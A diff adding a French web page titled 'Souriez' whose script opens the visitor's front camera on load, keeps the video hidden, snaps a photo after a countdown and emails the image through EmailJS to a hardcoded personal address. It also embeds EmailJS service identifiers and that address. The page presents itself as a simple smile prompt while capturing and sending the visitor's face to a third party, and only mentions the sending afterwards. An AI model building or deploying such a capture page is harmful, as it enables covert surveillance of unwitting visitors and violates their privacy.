@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Souriez</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      background: #f5f0e8;
+      font-family: 'Georgia', serif;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    h1 {
+      font-size: clamp(3rem, 10vw, 6rem);
+      color: #1a1a1a;
+      letter-spacing: -2px;
+      font-weight: normal;
+      font-style: italic;
+      transition: opacity 0.5s;
+    }
+
+    #status {
+      margin-top: 20px;
+      font-size: 1rem;
+      color: #888;
+      letter-spacing: 0.1em;
+      height: 24px;
+      transition: opacity 0.5s;
+    }
+
+    /* Caméra cachée */
+    video, canvas { display: none; }
+
+    /* Flash */
+    .flash {
+      position: fixed;
+      inset: 0;
+      background: white;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.08s;
+      z-index: 99;
+    }
+    .flash.on { opacity: 1; }
+
+    /* Message final */
+    #done {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 12px;
+      animation: fadeIn 0.6s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    #done .check { font-size: 4rem; }
+    #done p { font-size: 1rem; color: #555; font-style: italic; }
+
+    #main { display: flex; flex-direction: column; align-items: center; }
+  </style>
+</head>
+<body>
+
+<div class="flash" id="flash"></div>
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<div id="main">
+  <h1 id="title">Souriez&nbsp;😊</h1>
+  <div id="status">…</div>
+</div>
+
+<div id="done">
+  <div class="check">📬</div>
+  <p>Photo envoyée !</p>
+</div>
+
+<script>
+  // ──────────────────────────────────────────
+  //  CONFIGURATION — à remplir après EmailJS
+  // ──────────────────────────────────────────
+  const EMAILJS_PUBLIC_KEY  = 'd5oHiCF31u1e_XA5G';
+  const EMAILJS_SERVICE_ID  = 'service_bshde2h';
+  const EMAILJS_TEMPLATE_ID = 'template_t6if0la';
+  const DEST_EMAIL          = 'captain.couscous34@hotmail.com';
+  // ──────────────────────────────────────────
+
+  emailjs.init(EMAILJS_PUBLIC_KEY);
+
+  const video  = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const flash  = document.getElementById('flash');
+  const title  = document.getElementById('title');
+  const status = document.getElementById('status');
+  const main   = document.getElementById('main');
+  const done   = document.getElementById('done');
+
+  const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+  async function run() {
+    // 1. Accès caméra silencieux
+    status.textContent = '';
+    let stream;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      video.srcObject = stream;
+      await video.play();
+    } catch(e) {
+      status.textContent = 'Caméra non disponible.';
+      return;
+    }
+
+    // 2. Attendre que la caméra soit stable
+    await sleep(2500);
+
+    // 3. Compte à rebours discret
+    for (let i = 3; i >= 1; i--) {
+      status.textContent = i + '...';
+      await sleep(900);
+    }
+    status.textContent = '';
+
+    // 4. Flash + capture
+    flash.classList.add('on');
+    await sleep(80);
+    flash.classList.remove('on');
+
+    canvas.width  = video.videoWidth  || 640;
+    canvas.height = video.videoHeight || 480;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    const imageData = canvas.toDataURL('image/jpeg', 0.85);
+
+    // 5. Arrêter la caméra
+    stream.getTracks().forEach(t => t.stop());
+
+    // 6. Afficher transition
+    main.style.opacity = '0';
+    await sleep(500);
+    main.style.display = 'none';
+    done.style.display = 'flex';
+
+    // 7. Envoyer le mail
+    const now = new Date().toLocaleString('fr-FR');
+    try {
+      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+        to_email : DEST_EMAIL,
+        date_time: now,
+        image    : imageData,        // base64 — visible si ton template l'affiche
+      });
+    } catch(e) {
+      console.error('EmailJS error:', e);
+    }
+  }
+
+  run();
+</script>
+</body>
+</html>
